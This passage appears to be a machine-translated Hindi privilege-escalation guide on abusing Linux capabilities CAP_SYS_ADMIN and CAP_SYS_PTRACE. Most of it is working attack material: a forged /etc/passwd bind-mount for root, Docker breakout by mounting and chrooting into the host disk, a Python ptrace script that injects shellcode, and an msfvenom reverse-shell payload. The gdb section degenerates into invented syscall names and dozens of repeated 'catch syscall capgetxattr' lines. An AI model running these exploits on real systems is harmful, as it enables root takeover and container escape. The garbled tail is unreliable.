‡§ï‡§π‡•á‡§Ç ‡§§‡•ã, ‡§Ö‡§ó‡§∞ ‡§Ü‡§™‡§ï‡•á ‡§™‡§æ‡§∏ ‡§è‡§ï ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§π‡•à ‡§ú‡•ã:

1. ‡§∞‡•Ç‡§ü ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§∏‡•ç‡§µ‡§æ‡§Æ‡§ø‡§§‡•ç‡§µ‡§ø‡§ï ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à
2. `SUID`/`SGID` ‡§¨‡§ø‡§ü ‡§∏‡•á‡§ü ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡§Ç
3. ‡§ñ‡§æ‡§≤‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Å ‡§∏‡•á‡§ü ‡§π‡•à‡§Ç (‡§â‡§¶‡§æ.: `getcap myelf` `myelf =ep` ‡§≤‡•å‡§ü‡§æ‡§§‡§æ ‡§π‡•à)

‡§§‡•ã **‡§µ‡§π ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§∞‡•Ç‡§ü ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ö‡§≤‡•á‡§ó‡•Ä**‡•§

## CAP\_SYS\_ADMIN

[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ‡§¨‡§°‡§º‡•á ‡§π‡§ø‡§∏‡•ç‡§∏‡•á ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§∏‡§≠‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•à, ‡§Ø‡§π ‡§Ü‡§∏‡§æ‡§®‡•Ä ‡§∏‡•á ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§Ø‡§æ ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§∞‡•Ç‡§ü (‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞ ‡§∏‡§≠‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡§æ ‡§™‡§π‡•Å‡§Ç‡§ö) ‡§ï‡•Ä ‡§ì‡§∞ ‡§≤‡•á ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§ `CAP_SYS_ADMIN` ‡§ï‡•ã ‡§ï‡§à ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§®‡§ø‡§ï ‡§ë‡§™‡§∞‡•á‡§∂‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§ú‡•ã ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞‡•ç‡§∏ ‡§∏‡•á ‡§õ‡•ã‡§°‡§º‡§®‡§æ ‡§ï‡§†‡§ø‡§® ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§Ö‡§ó‡§∞ ‡§µ‡•á ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ï‡•á ‡§≠‡•Ä‡§§‡§∞ ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§§ ‡§ë‡§™‡§∞‡•á‡§∂‡§® ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§á‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•ã ‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞ ‡§™‡•Ç‡§∞‡•á ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•Ä ‡§§‡•Å‡§≤‡§®‡§æ ‡§Æ‡•á‡§Ç ‡§µ‡•ç‡§Ø‡§ï‡•ç‡§§‡§ø‡§ó‡§§ ‡§Ö‡§®‡•Å‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§∞‡§ñ‡§®‡§æ ‡§Ü‡§Æ ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§á‡§∏‡§ï‡•Ä ‡§Æ‡§¶‡§¶ ‡§∏‡•á **‡§°‡§ø‡§µ‡§æ‡§á‡§∏ ‡§Æ‡§æ‡§â‡§Ç‡§ü** ‡§ï‡§∞‡§®‡•á ‡§Ø‡§æ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§∏‡•á ‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§≤‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è **‡§∞‡§ø‡§≤‡•Ä‡§ú‡§º_‡§è‡§ú‡•á‡§Ç‡§ü** ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§

**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Python ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§Ü‡§™ ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ‡§ø‡§ï _passwd_ ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•á ‡§ä‡§™‡§∞ ‡§è‡§ï ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ _passwd_ ‡§´‡§º‡§æ‡§á‡§≤ ‡§Æ‡§æ‡§â‡§Ç‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
‡§î‡§∞ ‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç `/etc/passwd` ‡§™‡§∞ ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ `passwd` ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã **‡§Æ‡§æ‡§â‡§Ç‡§ü** ‡§ï‡§∞‡•á‡§Ç:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
‡§î‡§∞ ‡§Ü‡§™ **`su` ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§∞‡•Ç‡§ü** ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° "‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°" ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§Ç‡§ó‡•á‡•§

**‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£ (Docker breakout)**

‡§Ü‡§™ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§°‡•â‡§ï‡§∞ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
‡§™‡§ø‡§õ‡§≤‡•á ‡§Ü‡§â‡§ü‡§™‡•Å‡§ü ‡§Æ‡•á‡§Ç ‡§Ü‡§™ ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø SYS_ADMIN ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•à‡•§

* **‡§Æ‡§æ‡§â‡§Ç‡§ü**

‡§á‡§∏‡§∏‡•á ‡§°‡•â‡§ï‡§∞ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ï‡•ã **‡§π‡•ã‡§∏‡•ç‡§ü ‡§°‡§ø‡§∏‡•ç‡§ï ‡§ï‡•ã ‡§Æ‡§æ‡§â‡§Ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§á‡§∏‡•á ‡§∏‡•ç‡§µ‡§§‡§Ç‡§§‡•ç‡§∞ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ï‡§∞‡§®‡•á** ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§π‡•ã‡§§‡•Ä ‡§π‡•à:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **‡§™‡•Ç‡§∞‡•ç‡§£ ‡§™‡§π‡•Å‡§Ç‡§ö**

‡§™‡§ø‡§õ‡§≤‡•Ä ‡§µ‡§ø‡§ß‡§ø ‡§Æ‡•á‡§Ç ‡§π‡§Æ‡§®‡•á ‡§°‡•â‡§ï‡§∞ ‡§π‡•ã‡§∏‡•ç‡§ü ‡§°‡§ø‡§∏‡•ç‡§ï ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö‡§æ‡•§
‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡•ã ‡§≤‡§ó‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§π‡•ã‡§∏‡•ç‡§ü ‡§™‡§∞ ‡§è‡§ï **SSH** ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§ö‡§≤ ‡§∞‡§π‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ **‡§°‡•â‡§ï‡§∞ ‡§π‡•ã‡§∏‡•ç‡§ü** ‡§°‡§ø‡§∏‡•ç‡§ï ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§á‡§∏‡•á SSH ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™ ‡§π‡•ã‡§∏‡•ç‡§ü ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§ö‡§≤ ‡§∞‡§π‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§Æ‡•á‡§Ç ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§∏‡§Ç‡§Ø‡•ã‡§ú‡§ø‡§§ ‡§ï‡§∞‡§ï‡•á ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§∏‡•á ‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§** ‡§π‡•ã‡§∏‡•ç‡§ü ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§ö‡§≤ ‡§∞‡§π‡•Ä ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ï‡•ã ‡§ï‡§Æ ‡§∏‡•á ‡§ï‡§Æ **`--pid=host`** ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ö‡§≤‡§æ‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§

[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `ptrace(2)` ‡§î‡§∞ ‡§π‡§æ‡§≤ ‡§π‡•Ä ‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§∏‡•ç‡§§‡•Å‡§§ ‡§ï‡•Ä ‡§ó‡§à ‡§ï‡•ç‡§∞‡•â‡§∏ ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§Ö‡§ü‡•à‡§ö ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•â‡§≤‡•ç‡§∏ ‡§ú‡•à‡§∏‡•á `process_vm_readv(2)` ‡§î‡§∞ `process_vm_writev(2)` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§¶‡§ø ‡§á‡§∏ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•Ä ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡•Ä ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à ‡§î‡§∞ `ptrace(2)` ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•â‡§≤ ‡§∏‡•ç‡§µ‡§Ø‡§Ç ‡§è‡§ï ‡§∏‡•á‡§ï‡§Ç‡§™ ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§Ö‡§µ‡§∞‡•Å‡§¶‡•ç‡§ß ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ø‡§π ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞‡•ç‡§§‡•Ä ‡§ï‡•ã ‡§Ö‡§®‡•ç‡§Ø ‡§∏‡•á‡§ï‡§Ç‡§™ ‡§™‡•ç‡§∞‡§§‡§ø‡§¨‡§Ç‡§ß‡•ã‡§Ç ‡§ï‡•ã ‡§¶‡•å‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§ó‡§æ, [seccomp ‡§ï‡•ã ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§®‡•á ‡§™‡§∞ bypass ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è PoC](https://gist.github.com/thejh/8346f47e359adecd1d53) ‡§¶‡•á‡§ñ‡•á‡§Ç ‡§Ø‡§æ **‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ PoC** ‡§¶‡•á‡§ñ‡•á‡§Ç:

**‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§â‡§¶‡§æ‡§π‡§∞‡§£ (gdb)**

`ptrace` ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• `gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
‡§ú‡•Ä‡§°‡•Ä‡§¨‡•Ä ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§Æ‡§è‡§∏‡§è‡§´‡§µ‡•á‡§®‡§Æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§¨‡§®‡§æ‡§è‡§Ç‡•§

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<‡§Ü‡§™‡§ï‡§æ IP> LPORT=<‡§Ü‡§™‡§ï‡§æ ‡§™‡•ã‡§∞‡•ç‡§ü> -f c -b "\x00" -e x86/shikata_ga_nai
```

‡§Ø‡§π‡§æ‡§Ç `<‡§Ü‡§™‡§ï‡§æ IP>` ‡§ï‡•ã ‡§Ö‡§™‡§®‡•á ‡§Ü‡§à‡§™‡•Ä ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ ‡§∏‡•á ‡§î‡§∞ `<‡§Ü‡§™‡§ï‡§æ ‡§™‡•ã‡§∞‡•ç‡§ü>` ‡§ï‡•ã ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§∂‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§è ‡§ú‡§æ‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§™‡•ã‡§∞‡•ç‡§ü ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ ‡§∏‡•á ‡§¨‡§¶‡§≤‡•á‡§Ç‡•§
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
‡§ú‡•Ä‡§°‡•Ä‡§¨‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∞‡•Ç‡§ü ‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏ ‡§ï‡•ã ‡§°‡•Ä‡§¨‡§ó ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§™‡§π‡§≤‡•á ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ú‡•Ä‡§°‡•Ä‡§¨‡•Ä ‡§≤‡§æ‡§á‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§ï‡•â‡§™‡•Ä-‡§™‡•á‡§∏‡•ç‡§ü ‡§ï‡§∞‡•á‡§Ç:

```bash
gdb -p <pid>
```

‡§ú‡•Ä‡§°‡•Ä‡§¨‡•Ä ‡§™‡•ç‡§∞‡•ã‡§Æ‡•ç‡§™‡•ç‡§ü ‡§Æ‡•á‡§Ç ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§≤‡§æ‡§á‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§ï‡•â‡§™‡•Ä-‡§™‡•á‡§∏‡•ç‡§ü ‡§ï‡§∞‡•á‡§Ç:

```bash
set follow-fork-mode child
set detach-on-fork off
```

‡§Ö‡§¨, ‡§∞‡•Ç‡§ü ‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏ ‡§ï‡•ã ‡§°‡•Ä‡§¨‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ú‡•Ä‡§°‡•Ä‡§¨‡•Ä ‡§≤‡§æ‡§á‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§ï‡•â‡§™‡•Ä-‡§™‡•á‡§∏‡•ç‡§ü ‡§ï‡§∞‡•á‡§Ç:

```bash
catch syscall ptrace
catch syscall fork
catch syscall clone
catch syscall vfork
catch syscall execve
catch syscall execveat
catch syscall setuid
catch syscall setgid
catch syscall setreuid
catch syscall setregid
catch syscall setresuid
catch syscall setresgid
catch syscall setfsuid
catch syscall setfsgid
catch syscall capset
catch syscall capsetp
catch syscall capsetxattr
catch syscall capget
catch syscall capgetp
catch syscall capgetxattr
catch syscall capsetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
